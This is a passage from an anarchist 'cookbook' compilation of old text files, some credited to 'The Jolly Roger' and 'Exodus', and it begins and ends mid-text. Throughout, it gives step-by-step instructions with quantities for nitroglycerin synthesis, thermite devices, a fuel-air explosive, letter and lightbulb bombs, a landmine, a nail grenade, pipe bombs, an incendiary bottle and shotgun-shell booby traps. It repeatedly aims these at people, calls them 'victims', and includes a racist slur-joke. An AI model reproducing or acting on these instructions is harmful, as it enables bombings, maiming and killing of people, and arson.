assemble mold. The mold will have to have a hole in it for the fuse to stick
out. In about an hour, carefully separate the mold. You should have a ball
of thermite with the first fire mix in the center of it, and the fuse
sticking out of the ball. Dry the ball in the sun for about a week.
DO NOT DRY IT IN AN OVEN !
The fuse ignites the first fire mix which in turn ignites the thermite.
Since the thermite is ignited from the center out, the heat builds up in the
thermite and it burns faster than normal. The result is a small explosion.
The thermite ball burns in a split second and throws molten iron and slag
around. Use this carefully !

THERMITE WELL: To cut metal with thermite, take a refractory crucible and
drill a 1/4 in. hole in the bottom. Epoxy a thin (20 ga.) sheet of mild steel
over the hole. Allow the epoxy to dry. Fill the crucible with ferro-thermite
and insert a first fire igniter in the thermite. Fashion a standoff to the 
crucible. This should hold the crucible about 1 1/2 in. up. Place the well
over your target and ignite the first fire. The well works this way.
The thermite burns, making slag and iron. Since the iron is heavier it goes
to the bottom of the well. The molten iron burns through the metal sheet. 
This produces a small delay which gives the iron and slag more time to 
separate fully. The molten iron drips out through the hole in the bottom of
the crucible. The standoff allows the thermite to continue flowing out of the
crucible. The force of the dripping iron bores a hole in the target.
A 2 lb. thermite well can penetrate up to 3/4 in. of steel. Experiment with
different configurations to get maximum penetration. For a crucible, try a
flower pot coated with a magnesium oxide layer. Sometimes the pot cracks
however. Take the cast thermite formula and add 50% ferro-thermite to it. 
This produces a fair amount of iron plus a very liquid slag.

THERMITE FUEL-AIR EXPLOSION: This is a very dangerous device. Ask yourself
if you really truly want to make it before you do any work on it.
It is next to impossible to give any dimensions of containers or weights
of charges because of the availability of parts changes from one person to
the next. However here is a general description of this device affectionately
known as a HELLHOUND.
      Make a thermite charge in a 1/8 in. wall pipe. This charge must be 
electrically ignited. At the opposite end of the pipe away from the ignitor
side put a small explosive charge of flash powder weighing about 1 oz.
Drill a small hole in a pipe end cap and run the wires from the ignitor 
through the hole. Seal the wires and hole up with fuel proof epoxy or cement.
Try ferrule cement available at sporting goods stores. Dope the threads of
the end caps with a good pipe dope and screw them onto the pipe.
This gives you a thermite charge in an iron pipe arranged so that when the 
thermite is electrically ignited, it will burn from one end to the other
finally setting of the flash powder charge.
Place this device in a larger pipe or very stout metal container which is
sealed at one end. Use a couple of metal "spiders" to keep the device away
from the walls or ends of the larger container. Run the wires out through
the wall of the container and seal the wires with the fuel proof epoxy.
Fill the container with a volatile liquid fuel. Acetone or gasoline works
great. Now seal up the container with an appropriate end cap and it is done.

The device works like this: Attach a timer-power supply to the wires. When
the thermite is ignited it superheats the liquid fuel. Since the container
is strong enough to hold the pressure the fuel does not boil. When the
thermite burns down to the explosive, it explodes rupturing the container
and releasing the superheated fuel. The fuel expands, cooling off and 
making a fine mist and vapor that mixes with the surrounding air. The hot 
thermite slag is also thrown into the air which ignites the fuel-air mix.
The result is obvious. Try about 1 1/2 lbs of thermite to a gallon of fuel.
For the pressure vessel, try an old pressure cooker. Because the fuel may
dissolve the epoxy don't keep this device around for very long.
But ask yourself, do you really want to make this?


EXOTIC THERMITES: Thermites can also be made from teflon-magnesium or metal
flourides-magnesium or aluminum. If there is an excess of flouride compound
in the mixture, flourine gas can be released. Flourine is extremely 
corrosive and reactive. The gas can cause organic material to burst into
flames by mere contact. For teflon-magnesium use 67% teflon and 33% magnesium
A strong first fire igniter should be used to ignite this mixture. Both the
teflon and the magnesium should be in powdered form. Do not inhale any
smoke from the burning mixture.
If you use metal-florides instead of teflon, use flourides of low energy
metals. Lead flouride is a good example. Try using 90% lead flouride and
10% aluminum.
Warning: Flouride compounds can be very poisonous. They are approximately
equal to cyanide compounds.
Another exotic mix is tricalcium orthophosphate and aluminum. When this 
burns,it forms calcium phosphide which when contacts water releases hydrogen
phosphide which can ignite spontaneously in air.
Tricalcium orthophosphate has the formula Ca3(PO4)2 and is known as white-
lockite. Use about 75% orthophosphate and 25% aluminum. This ratio may have
to be altered for better burning as I have not experimented with it much and
don't know if more aluminum may reduce the calcium better. It does work but
it is a hard to ignite mixture. A first fire mix containing a few percent 
of magnesium works well.

Fighting thermite fires: Two ways to fight thermite fires are either 
smothering the thermite with sand. This doesn't put out the thermite but it
does help contain it and block some of the heat.
The other way is to flood the thermite with a great amount of water. This
helps to break the thermite apart and stop the reaction. If you use a small
amount of water, an explosion may result as the thermite may reduce the water
and release hydrogen gas.
Thermite can start fires from the heat radiating from the reaction. Nearby
flammable substances can catch fire even though no sparks or flame touch 
them.

Nitroglycerin Recipe                            by the Jolly Roger

Like all chemists I must advise you all to take the greatest care
and caution when you are doing this.  Even if you have made this stuff
before.
This first article will give you information on making
nitroglyerin, the basic ingredient in a lot of explosives such as
straight dynamites, and geletin dynamites.
Making nitroglycerin
1. Fill a 75-milliliter beaker to the 13 ml. Level with fuming
   red nitric acid, of 98% pure concentration.
2. Place the beaker in an ice bath and allow to cool below room
   temp.
3. After it has cooled, add to it three times the amount of
   fuming sulferic acid (99% h2so4).  In other words, add to the
   now-cool fuming nitric acid 39 ml. Of fuming sulferic acid.
   When mixing any acids, always do it slowly and carefully to
   avoid splattering.
4. When the two are mixed, lower thier temp. By adding more ice
   to the bath, about 10-15 degrees centigrade. (Use a
   mercury-operated thermometer)
5. When the acid solution has cooled to the desired temperature,
   it is ready for the glycerin. The glycerin must be added in
   small amounts using a medicine dropper.  (Read this step about
   10 times!)  Glycerin is added slowly and carefully (i mean
   careful!) Until the entire surface of the acid it covered with
   it.
6. This is a dangerous point since the nitration will take place
   as soon as the glycerin is added. The nitration will produce
   heat, so the solution must be kept below 30 degrees
   centigrade! If the solution should go above 30 degrees,
   immediately dump the solution into the ice bath!  This will
   insure that it does not go off in your face!
7. For the first ten minutes of nitration, the mixture should be
   gently stirred.  In a normal reaction the nitroglycerin will
   form as a layer on top of the acid solution, while the sulferic
   acid will absorb the excess water.
8. After the nitration has taken place, and the nitroglycerin has
   formed on the top of the solution, the entire beaker should be 
   transferred slowly and carefully to another beaker of water. 
   When this is done the nitroglycerin will settle at the bottem
   so the other acids can be drained away.
9. After removing as much acid as posible without disturbing the
   nitroglycerin, remove the nitroglycerin with an eyedropper and
   place it in a bicarbonate of soda (sodium bicarbonate in case
   you didn't know) solution.  The sodium is an alkalai and will
   nuetralize much of the acid remaining. This process should be
   repeated as much as necesarry using blue litmus paper to check
   for the presence of acid.  The remaining acid only makes the
   nitroglycerin more unstable than it already is.
10. Finally! The final step is to remove the nitroglycerin from
    the bicarbonate.  His is done with and eye- dropper, slowly
    and carefully.  The usual test to see if nitration has been
    successful is to place one drop of the nitroglycerin on metal
    and ignite it.  If it is true nitroglycerin it will burn with
    a clear blue flame.
** Caution **
Nitro is very sensative to decomposition, heating dropping, or
jarring, and may explode if left undisturbed and cool.

NITROGLYCERINE

     Nitroglycerine is one of the most sensitive explosives, if it is not the
most sensitive.  Although it is possible to make it safely, it is difficult.
Many a young anarchist has been killed or seriously injured while trying to
make the stuff.  When Nobel's factories make it, many people were killed by
the all-to-frequent factory explosions.  Usually, as soon as it is made, it is
converted into a safer substance, such as dynamite.  An idiot who attempts to
make nitroglycerine would use the following procedure:

     MATERIAL               EQUIPMENT
                    
     distilled water        eye-dropper

     table salt             100 ml beaker

     sodium bicarbonate     200-300 ml beakers (2)

     concentrated nitric    ice bath container
     acid (13 ml)           ( a plastic bucket serves well )

     concentrated sulfuric  centigrade thermometer
     acid (39 ml)

     glycerine              blue litmus paper


1)  Place 150 ml of distilled water into one of the 200-300 ml beakers.

2)  In the other 200-300 ml beaker, place 150 ml of distilled water and about
   a spoonful of sodium bicarbonate, and stir them until the sodium
   bicarbonate dissolves.  Do not put so much sodium bicarbonate in the water
   so that some remains undissolved.

3)  Create an ice bath by half filling the ice bath container with ice, and
   adding table salt.  This will cause the ice to melt, lowering the overall
   temperature.

4)  Place the 100 ml beaker into the ice bath, and pour the 13 ml of
   concentrated nitric acid into the 100 ml beaker.  Be sure that the beaker
   will not spill into the ice bath, and that the ice bath will not overflow
   into the beaker when more materials are added to it.  Be sure to have a
   large enough ice bath container to add more ice.  Bring the temperature of
   the acid down to about 20 degrees centigrade or less.

5)  When the nitric acid is as cold as stated above, slowly and carefully add
   the 39 ml of concentrated sulfuric acid to the nitric acid.  Mix the two
   acids together, and cool the mixed acids to 10 degrees centigrade.  It is a
   good idea to start another ice bath to do this.

6)  With the eyedropper, slowly put the glycerine into the mixed acids, one
   drop at a time.  Hold the thermometer along the top of the mixture where
   the mixed acids and glycerine meet.

      DO NOT ALLOW THE TEMPERATURE TO GET ABOVE 30 DEGREES CENTIGRADE; IF
        THE TEMPERATURE RISES ABOVE THIS TEMPERATURE, WATCH OUT !!

   The glycerine will start to nitrate immediately, and the temperature will
immediately begin to rise.  Add glycerine until there is a thin layer of
glycerine on top of the mixed acids.  It is always safest to make any
explosive in small quantities.

7)  Stir the mixed acids and glycerine for the first ten minutes of nitration,
   adding ice and salt to the ice bath to keep the temperature of the solution
   in the 100 ml beaker well below 30 degrees centigrade.  Usually, the
   nitroglycerine will form on the top of the mixed acid solution, and the
   concentrated sulfuric acid will absorb the water produced by the reaction.

8)  When the reaction is over, and when the nitroglycerine is well below 30
   degrees centigrade, slowly and carefully pour the solution of
   nitroglycerine and mixed acid into the distilled water in the beaker in
   step 1.  The nitroglycerine should settle to the bottom of the beaker, and
   the water-acid solution on top can be poured off and disposed of. Drain as
   much of the acid- water solution as possible without disturbing the
   nitroglycerine.

9)  Carefully remove the nitroglycerine with a clean eye-dropper, and place it
   into the beaker in step 2.  The sodium bicarbonate solution will eliminate
   much of the acid, which will make the nitroglycerine more stable, and less
   likely to explode for no reason, which it can do.  Test the nitroglycerine
   with the litmus paper until the litmus stays blue.  Repeat this step if
   necessary, and use new sodium bicarbonate solutions as in step 2.

10) When the nitroglycerine is as acid-free as possible, store it in a clean
   container in a safe place.  The best place to store nitroglycerine is far
   away from anything living, or from anything of any value. Nitroglycerine
   can explode for no apparent reason, even if it is stored in a secure cool
   place.

Solidox Bombs                                   by The Jolly Roger

Most people are not aware that a volatile, extremely explosive 
chemical can be bought over the counter:  Solidox.

Solidox comes in an aluminum can containing 6 grey sticks, and can 
be bought at Kmart, and various hardware supply shops for around 
$7.00.  Solidox is used in welding applications as an oxidizing 
agent for the hot flame needed to melt metal.  The most active 
ingredient in Solidox is potassium chlorate, a filler used in many 
military applications in the WWII era.

Since Solidox is literally what the name says:  SOLID OXygen, you 
must have an energy source for an explosion.  The most common and 
readily available energy source is common household sugar, or 
sucrose.  In theory, glucose would be the purest energy source, 
but it is hard to find a solid supply of glucose.

Making the mixture:

[1]  Open the can of Solidox, and remove all 6 sticks.  One by 
     one, grind up each of the sticks (preferably with a mortar 
     and pestle) into the finest powder possible.
[2]  The ratio for mixing the sugar with the Solidox is 1:1, so 
     weigh the Solidox powder, and grind up the equivalent amount 
     of sugar.
[3]  Mix equivalent amounts of Solidox powder, and sugar in a 1:1 
     ratio.

It is just that simple!  You now have an extremely powerful 
substance that can be used in a variety of applications.  A word 
of caution:  be EXTREMELY careful in the entire process.  Avoid 
friction, heat, and flame.  A few years back, a teenager I knew 
blew 4 fingers off while trying to make a pipe bomb with Solidox.  
You have been warned!


SolidOx can no longer be bought in KMart.  A plumbing and heating supply
store, or even Sears may have small quantities for sale, at about
$18.00 for 10 stix.

               How to make a CO2 bomb        by the Jolly Roger

You will have to use up the cartridge first by either shooting it 
or whatever. With a nail, force a hole bigger so as to allow the 
powder and wick to fit in easily. Fill the cartridge with black 
powder and pack it in there real good by tapping the bottom of the 
cartridge on a hard surface (I said TAP not SLAM!). Insert a fuse. 
I recommend a good water-proof cannon fuse, or an m-80 type fuse, 
but firecracker fuses work, if you can run like a black man runs 
from the cops after raping a white girl.) Now, light it and run 
like hell! It does wonders for a row of mailboxes (like the ones 
in apartment complexes), a car (place under the gas tank), a 
picture window (place on window sill), a phone booth (place right 
under the phone), or any other devious place. This thing throws 
shrapnel, and can make quit a mess!!  -Jolly Roger-



Thermite II... or A better way to make Thermite        by Jolly Roger

Thermite is nasty shit. Here is a good and easy way to make it. 
The first step is to get some iron-oxide (which is RUST!). Here is 
a good way to make large quantities in a short time:

- Get a DC convertor like the one used on a train set. Cut the 
connector off, seperate the wires, and strip them both.

- Now you need a jar of water with a tablespoon or so of sodium 
chloride (which is SALT!) added to it. This makes the water 
conductive.

- Now insert both wires into the mixture (I am assuming you 
plugged the convertor in...) and let them sit for five minutes. 
One of them will start bubbling more than the other. This is the 
POSITIVE(+) wire. If you do not do this test right, the final 
product will be the opposite (chemically) of rust, which is RUST 
ACID. You have no use for this here (although it IS useful!).

- Anyway, put the nail tied to the positive wire into the jar. Now 
put the negative wire in the other end. Now let it sit overnight 
and in the morning scrape the rust off of the nail & repeat until 
you got a bunch of rust on the bottom of the glass. Be generous 
with your rust collection. If you are going through the trouble of 
making thermite, you might as well make a lot, right?

- Now remove the excess water and pour the crusty solution onto a 
cookie sheet. Dry it in the sun for a few hours, or inside 
overnight. It should be an orange-brown color (although I have 
seen it in many different colors! Sometimes the color gets fucked 
up, what can I say... but it is still iron oxide!)

- Crush the rust into a fine powder and heat it in a cast-iron pot 
until it is red. Now mix the pure iron oxide with pure alluminum 
filinos which can be bought or filed down by hand from an aluminum 
tube or bar. The ratio or iron oxide to aluminum is 8 grams to 3 
grams.

- Congrats! You have just made THERMITE! Now, to light it...

- Thermite requires a LOT of heat (more than a blow torch!) to 
ignite. However, a magnesium ribbon (which is sorta hard to find.. 
call around) will do the trick.  It takes the heat from the 
burning magnesium to light the thermite.

- Now when you see your victim's car, pour a fifty-cent sized pile 
onto his hood, stick the ribbon in it, and light the ribbon with 
the blow torch. Now chuckle as you watch it burn through the hood, 
the block, the axle, and the pavement. BE CAREFUL! The ideal 
mixtures can vaporize CARBON STEEL! Another idea is to use 
thermite to get into pay phone cash boxes. HAVE FUN!!

Letter Bombs                            by The Jolly Roger

- You will first have to make a mild version of thermite. Use my 
recipe, but substitute iron fillings for rust. 

- Mix the iron with aluminum fillings in a ratio of 75% aluminum 
to 25% iron. This mixture will burn violently in a closed space 
(such as an envelope). This bring us to our next ingredient...

- Go to the post office and buy an insulated (padded) envelope. 
You know, the type that is double layered... Seperate the layers 
and place the mild thermite in the main section, where the letter 
would go. Then place magnesium powder in the outer layer. There is 
your bomb!!

- Now to light it... this is the tricky part and hard to explain. 
Just keep experimenting until you get something that works. The 
fuse is just that touch explosive I have told you about in another 
one of my anarchy files. You might want to wrap it like a long 
cigarette and then place it at the top of the envelope in the 
outer layer (on top of the powdered magnesium). When the touch 
explosive is torn or even squeezed hard it will ignite the 
powdered magnesium (sort of a flash light) and then it will burn 
the mild thermite. If the thermite didn't blow up, it would at 
least burn the fuck out of your enemy (it does wonders on human 
flesh!).

Paint Bombs                          by The Jolly Roger

To make a pain bomb you simply need a metal pain can with a 
refastenable lid, a nice bright color paint (green, pink, purple, 
or some gross color is perfect!), and a quantity of dry ice. Place 
the paint in the can and then drop the dry ice in. Quicky place 
the top on and then run like hell! With some testing you can time 
this to a science. It depends on the ratio of dry ice to paint to 
the size of the can to how full it is. If you are really pissed 
off at someone, you could place it on their doorstep, knock on the 
door, and then run!! Paint will fly all over the place HAHAHA!!

--LIGHTBULB BOMBS 2                                     -= Exodus =-

     An automatic reaction to walking into a dark room is to turn on the
light. This can be fatal, if a lightbulb bomb has been placed in the overhead
light socket.  A lightbulb bomb is surprisingly easy to make.  It also comes
with its own initiator and electric ignition system.  On some lightbulbs, the
lightbulb glass can be removed from the metal base by heating the base of a
lightbulb in a gas flame, such as that of a blowtorch or gas stove.  This must
be done carefully, since the inside of a lightbulb is a vacuum.  When the glue
gets hot enough, the glass bulb can be pulled off the metal base.  On other
bulbs, it is necessary to heat the glass directly with a blowtorch or
oxy-acetylene torch. In either case, once the bulb and/or base has cooled down
to room temperature or lower, the bulb can be filled with an explosive
material, such as black powder.  If the glass was removed from the metal base,
it must be glued back on to the base with epoxy.  If a hole was put in the
bulb, a piece of duct tape is sufficient to hold the explosive in the in the
bulb.  Then, after making sure that the socket has no power by checking with a
working lightbulb, all that need be done is to screw the lightbulb bomb into
the socket.  Such a device has been used by terrorists or assassins with much
success, since few people would search the room for a bomb without first
turning on the light.
How to make a landmine                          by The Jolly Roger

First, you need to get a pushbutton switch. Take the wires of it 
and connect one to a nine volt battery connector and the other to 
a solar igniter (used for launching model rockets). A very thin 
piece of stereo wire will usually do the trick if you are 
desperate, but I recommend the igniter. Connect the other wire of 
the nine-volt battery to one end of the switch. Connect a wire 
from the switch to the other lead on the solar igniter. 

       switch-----------battery
         \                  /
          \                /

              explosive

Now connect the explosive (pipe bomb, m-80, CO2 bomb, etc.) to the 
igniter by attaching the fuse to the igniter (seal it with scotch 
tape). Now dig a hole; not too deep but enough to cover all of the 
materials. Think about what direction your enemy will be coming from
and plant the switch, but leave the button visible (not TOO 
visible!). Plant the explosive about 3-5 feet away from the switch 
because there will be a delay in the explosion that depends on how 
short your wick is, and, if a homemade wick is being used, its 
burning speed. But if you get it right... and your enemy is close 
enough......... BBBBBBBOOOOOOOOOOOOOOOOOOOOOOOOMMMM! hahahaha

To all those who do not wish to inflict bodily damage on their victims
but only terror.
These are weapons that should be used from high places.
1) The flour bomb.
Take a wet paper towel and pour a given amount of baking flour in
the center. Then wrap it up and put on a rubber band to keep it
together. When thrown it will fly well but when it hits, it covers
the victim with the flower or causes a big puff of flour which will
put the victim in terror since as far as they are concerned, some
strange white powder is all over them. This is a cheap method of
terror and for only the cost of a roll of paper towels and a bag of
flour you and your friends can have loads of fun watching people
flee in panic.
2) Smoke bomb projectile.
All you need is a bunch of those little round smoke bombs and a
wrist rocket or any sling-shot. Shoot the smoke bombs and watch the
terror since they think it will blow up!
3) Rotten eggs (good ones)
Take some eggs and get a sharp needle
and poke a small hole in the top of each one.
Then let them sit in a warm place for about a week. Then you've got a
bunch of rotten eggs that will only smell when they hit.
4) Glow in the dark terror.
Take one of those tubes of glow in the dark stuff and pour the
stuff on whatever you want to throw and when it gets on the victim,
they think it's some deadly chemical or a radioactive substance so
they run in total panic. This works especially well with flower
bombs since a gummy, glowing substance gets all over the victim.
5) Fizzling panic.
Take a baggie of a water-baking soda solution and seal it. (Make
sure there is no air in it since the solution will form a gas and
you don't want it to pop on you.) Then put it in a bigger plastic
bag and fill it with vinegar and seal it. When thrown, the two
substances will mix and cause a violently bubbling substance to go
all over the victim.

ideal for the destruction of enclosed areas such as rooms or buildings.

Material Required
-----------------
A flat can, 3 in. (8 cm) in diameter and 1-1/2 in. (3-3/4 cm) high. A 6-
     1/2 ounce tuna can serves the purpose quite well.
Blasting cap
Explosive
Aluminum (may be wire, cut sheet, flattened can, or powder)
Large nail, 4 in. (10 cm) long
Wooden rod - 1/4 in. (6 mm) diameter
Flour, gasoline, and powder or chipped aluminum

NOTE: Plastic explosive produce better explosions than cast explosives.

Procedure:
---------

1) Using the nail, press a hole through the side of the tuna can 3/8 inch 
to 1/2 inch (1 to 1-1/2 cm) from the bottom. Using a rotating and lever 
action, enlarge the hole until it will accomodate the blasting cap.
2) Place the wooden rod in the hole and position the end of the rod at the 
center of the can.
3) Press explosive into the can, being sure to surround the rod, until it 
is 3/4 inch (2 cm) from the top of the can. Carefully remove the wooden 
rod.
4) Place the aluminum metal on top of the explosive.
5) Just before use, insert the blasting cap into the cavity made by the 
rod. The initiator is now ready to use.

NOTE: If it is desired to carry the initiator some distance, cardboard may 
be pressed on top of the aluminum to insure against loss of material.

How to Use:
----------

     This particular unit works quite well to initiate charges of five 
pounds of flour, 1/2 gallon (1-2/3 litres) of gasoline, or two pounds of 
flake painters aluminum. The solid materials may merely be contained in 
sacks or cardboard cartons. The gasoline may be placed in plastic coated 
paper milk cartons, as well as plastic or glass bottles. The charges are 
placed directly on top of the initiator and the blasting cap is actuated 
electrically or by a fuse depending on the type of cap employed. this will 
destroy a 2,000 cubic feet enclosure (building 10 x 20 x 10 feet).

Note: For larger enclosures, use proportionally larger initiators and 
charges.

Nail Grenade                                       by the Jolly Roger

     Effective fragmentation grenades can be made from a block of tnt or 
other blasting explosive and nails.

Material Required:
-----------------

Block of TNT or other blasting explosive
Nails
Non-electric (military or improvised) blasting cap
Fuse Cord
Tape, string, wire, or glue

Procedure:
---------

1) If an explosive charge other than a standard TNT block is used, make a 
hole in the center of the charge for inserting the blasting cap. TNT can 
be drilled with relative safety. With plastic explosives, a hole can be 
made by pressing a round stick into the center of the charge. The hole 
should be deep enough that the blasting cap is totally within the 
explosive.
2) Tape, tie, or glue one or two rows of closely packed nails to the 
sides of the explosive block. Nails should completely cover the four 
surfaces of the block.
3) Place blasting cap on one end of the fuse cord and crimp with pliers.

NOTE: To find out how long the fuse cord should be, check the time it 
takes a known length to burn. If 12 inches (30 cm) burns for 30 seconds, 
a 10 second delay will require a 4 inch (10 cm) fuse.

4) Insert the blasting cap in the hole in the block of explosive. Tape or 
tie fuse cord securly in place so that it will not fall out when the 
grenade is thrown.

Alternate Use:
-------------

An effective directional anti-personnel mine can be made by placing nails 
on only one side of the explosive block. For this case, an electric 
blasting cap can be used.

      Glass bottle with stopper (roughly 1 quart size)
      Small Bottle or jar with lid.
      Rag or absorbant paper (paper towels, newspaper)
      String or rubber bands

      Procedure:
      ---------

      1)  Sulphuric  Acid MUST be concentrated. If battery acid or other
      dilute acid is used, concentrate it by boiling until  dense  white
      fumes  are  given  off.  Container  used  to  boil  should  be  of
      enamel-ware or oven glass.

      CAUTION: Sulphuric Acid will burn skin and  destroy  clothing.  If
      any is spilled, wash it away with a large quantity of water. Fumes
      are also VERY dangerous and should not be inhaled.

      2)   Remove  the  acid  from  heat  and  allow  to  cool  to  room
      temperature.

      3) Pour gasoline into the large  (1  quart)  bottle  until  it  is
      approximately 1/3 full.

      4)  Add  concentrated  sulphuric acid to gasoline slowly until the
      bottle is filled to within 1" to 2" from top. Place the stopper on
      the bottle.

      5) Wash the outside of the bottle thoroughly with clear water.

      CAUTION: If this is not done, the fire bottle may be dangerous  to
      handle during use!

      6)  Wrap a clean cloth or several sheets of absorbant paper around
      the outside of the bottle. Tie with string or fasten  with  rubber
      bands.

      7)  Dissolve 1/2 cup (100 grams) of potassium chlorate and 1/2 cup
      (100 grams) of sugar in one cup (250 cc) of boiling water.

      8) Allow the solution to cool, pour into the small bottle and  cap
      tightly.  The  cooled  solution should be approx. 2/3 crystals and
      1/3 liquid. If there is more than this,  pour  off  excess  before
      using.

      CAUTION: Store this bottle seperately from the  other bottle!

      How To Use:
      ----------

      1)  Shake the small bottle to mix contents and pour onto the cloth
      or paper around the large bottle. Bottle can be used wet or  after
      solution is dried. However, when dry, the sugar-Potassium chlorate
      mixture  is very sensitive to spark or flame and should be handled
      accordingly.

      2) Throw or launch the bottle. When the bottle  breaks  against  a
      hard surface (target) the fuel will ignite.

          Hand  Grenades  can  be  made  from  a piece of iron pipe. The
      filler  can  be  of  plastic  or  granular   military   explosive,
      improvised  explosive,  or  propellant  from shotgun or small arms
      munition.

      Material Required:
      -----------------

      Iron Pipe, threaded ends, 1-1/2" to 3" diameter, 3" to 8" long.
      Two (2) iron pipe caps
      Explosive or propellant
      Nonelectric blasting cap (Commercial or military)
      Fuse cord
      Hand Drill
      Pliers

      Procedure:
      ---------

      1) Place blasting cap on one end  of  fuse  cord  and  crimp  with
      pliers.

      NOTE: To find out how long the fuse cord should be, check the time
      it takes a known length to burn. If 12 inches burns in 30 seconds,
      a 6 inch cord will ignite the grenade in 15 seconds.

      2)  Screw  pipe  cap  to one end of the pipe. Place fuse cord with
      blasting cap into the opposite end so that  the  blasting  cap  is
      near the center of the pipe.

      NOTE:  If  plastic  explosive  is  to  be  used,  fill pipe BEFORE
      inserting blasting cap. Push a round stick into the center of  the
      explosive to make a hole and then insert the blasting cap.

      3)  Pour explosive or propellant into pipe a little bit at a time.
      Tap the base of the pipe frequently to settle filler.

      4) Drill a hole in the center of  the  unassembled  pipe  caplarge
      enough for the fuse cord to pass through.

      5)  Wipe  pipe  threads  to  remove any filler material. Slide the
      drilled pipe cap over the fuse and screw handtight onto the pipe.

 This is one of my favorites.  This creates a very unstable explosive in a very
 stable continer.  You will need:


 1) A two-ended bottle.  These are kinda hard to find, you have to look around,
  but if you cant find one, you will need a similar container in which there
  are two totally seperate sides that are airtight and accessable at the ends,
  like this:

  the seperator MUST remain airtight/watertight so this doesn't blow off your
  arm in the process (believe me. it will if you are not exact)

 2) Pure potassium. Not Salt Peter, or any shit like that.  This must be the
  pure element.  This again may prove hard to find.  Try a school chemistry
  teacher.  Tell her you need it for a project, or some shit like that.  Try
  to get the biggest piece you can, because this works best if it a solid
  chuck, not a powder.  You can also try Edmund Scientific Co. at:

  or call 1-(609)-547-8880

  
 3) Cotton
 
 4) Water


  Instructions:


  Take the cotton and stuff some into one end of the container lining one side
  of the seperator.  Place some potassiun, about the size of a quarter or 
  bigger (CAREFULLY, and make sure your hands are PERFECTLY DRY, this stuff
  reacts VERY VIOLENTLY with water) into that side and pack it in tightly with
  all the cotton you can fit.  Now screw the cap on TIGHTLY.
  	On the other side of the seperator, fill it with as much water as will
  fit, and screw that cap on TIGHTLY.  You are now in possession of a compact
  explosive made somewhat stable.  To explode, throw it at something! The water
  will react with the potassium, and BBBOOOOOOMMMM!!!  Works great on windows
  or windshields, because the glass fragments go everywhere (stand back) and 
  rip stuff apart.  The bigger the piece, the bigger the boom.  If no potassium
  can be found, thy looking for PURE Sodium, it works well too.

                       Phunn With Shotgun Shells



This phile is for those have no concern for themselves or the person they 
wanna fuck over with this. (in short, a fucking MANIAC!!!)


DoorBlams
---------

Shotgun shells are wonderful.  They can be used in almost any situation where 
pain or amputation of limbs is concerned (including your own if you are not
XTREEMLY careful. The best way to use shells, is the DoorBlam. The DoorBlam is
a simple concoction of a shell taped to the back of a door with the ignition
button facing away from the door (so it blows out against the door). Now 
position it somewhere where it will do the damage you want.  ie- near the top
for decapitation, middle for slow death, or low to make the victims kneecaps
fly across the room.  Now tape a thumbtack against a wall or something that
that part of the door bumps up against. Tape it to the wall so that the point
pokes through the tape, and position it so it will hit the ignit. button upon
impact... Its that simple.  Instant pain!


Long Range Explosives
---------------------

These are THE most difficult explosive i have ever tried to make (people i know
have lost fingers and hands to this little fucker)  IF you have a VVVVERY still
hand, it might be accomplished.  Ignit. buttons usually take some force to 
make it blow, so CAREFULLY & LIGHTLY push a tack through tape and tape it to 
the back of the shell, with the tip of the tack LIGHTLY touching the button.
Add more tape to the back to hold the pin in place. If you still have hands at 
this point, consider yourself lucky.  Now you need to add a weight to the 
tack-end part to make sure it hits the ground first. Taping small rocks or 
making the shell by putting heavy loads towards the button helps.  Placing a 
cracker (yes a cracker (Saltines, anyone ?)) between the tack-point and the 
button helps prevent detonation upon THROWING, which DOES happen.  Now toss 
it up high and AWAY from you, and RUN LIKE SHIT does after you eat Mexican.



These two pranx are HIGHLY UNRECOMMENDED, and EXODUS takes NO responsibility for
any causes of performing them nor the results.

-This may not really be what we would consider a bomb, but it is a 
helluva great idea to phuck someone over.  You will need:

(1)-person you hate who has a car

(1)-container of liquid nitrogen (try a science shop, or Edmund 
Scientific, mentioned in several places in this Cookbook)

(6-10)-cans of generic shaving cream

(1)-free afternoon (preferably in FREEZING temperatures outside)

(1-or more)-pairs of pliars, for cutting and peeling

some phriends


Directions:

Find someone who owns a small compact car, and manage to find out 
where he keeps it at night (or while he is away!) Be able to open 
the car repeatedly.. Place a can in the liquid nitrogen for about 30 
sec.  Take it out and carefully and QUICKLY peel off the metal 
outside container, and you should have a frozen "block" of shaving 
cream.  (It helps to have more than one container, and more phriends)
Toss it into the car and do the same with all the cans.  A dozen or 
more "blocks" like this can fill and lightly PRESSURIZE a small 
car.  When he opens the door (hopefully he doesn't realize the mess 
inside due to the foggy windows), he will be covered with lbs of 
shaving cream that is a bitch to get out of upholstry. 


PS!- Try to get one is his glove compartment!!!!!

PIPE BOMBS FROM SOFT METAL PIPES                          -= Exodus =-

   First, one flattens one end of a copper or aluminum pipe carefully, making
sure not to tear or rip the piping.  Then, the flat end of the pipe should be
folded over at least once, if this does not rip the pipe.  A fuse hole should
be drilled in the pipe near the now closed end, and the fuse should be
inserted.

    Next, the bomb- builder would partially fill the casing with a low order
explosive, and pack it with a large wad of tissue paper.  He would then
flatten and fold the other end of the pipe with a pair of pliers.  If he was
not too dumb, he would do this slowly, since the process of folding and
bending metal gives off heat, which could set off the explosive.  A diagram is
presented below:

 Fun with dry ice... LOTS of fun with dry ice.  (from the Usenet.)
 ---------------------------------------------


   There is no standard formula for a dry ice bomb, however a generic form is
as follows:

Take a 2-liter soda bottle, empty it completely, then add about 3/4 Lb of
Dry Ice (crushed works best) and (optional) a quantity of water.

   Depending on the condition of the bottle, the weather, and the amount and
temperature of the bottle the bomb will go off in 30 seconds - 5 minutes.
Without any water added, the 2-liter bottles will go often in 3-7 minutes if
dropped into a warm river, and in 45 minutes to 1 1/2 hours in open air.

   The explosion sounds equivalent to an M-100. _Plastic_ 16 oz. soda bottles
and 1 liter bottles work almost as well as do the 2-liters, however glass
bottles aren't nearly as loud, and can produce dangerous shrapnel.

   Remember, these are LOUD! A classmate of mine set up 10 bottles
in a nearby park without adding water. After the first two went off (there
was about 10 minutes between explosions) the Police arrived and spent the
next hour trying to find the guy who they thought was setting off M-100's
all around them...

USES FOR DRY ICE

Time Bombs:

1.   Get a small plastic container with lid (we used the small plastic  cans
  that hold the coaters used for large-format Polaroid film). A  film canister
  would probably work; the key is, it should seal tightly  and take a fair
  amount of effort to open).
     Place a chunk of dry ice in the can, put on the lid without quite
  sealing it. Put the assembled bomb in your pocket, or behind your  back.
     Approach the mark and engage in normal conversation. When his  attention
  is drawn away, quickly seal the lid on the bomb, deposit it  somewhere
  within a few feet of the mark, out of obvious sight, then  leave.
      Depending on variables (you'll want to experiment first), you'll hear  a
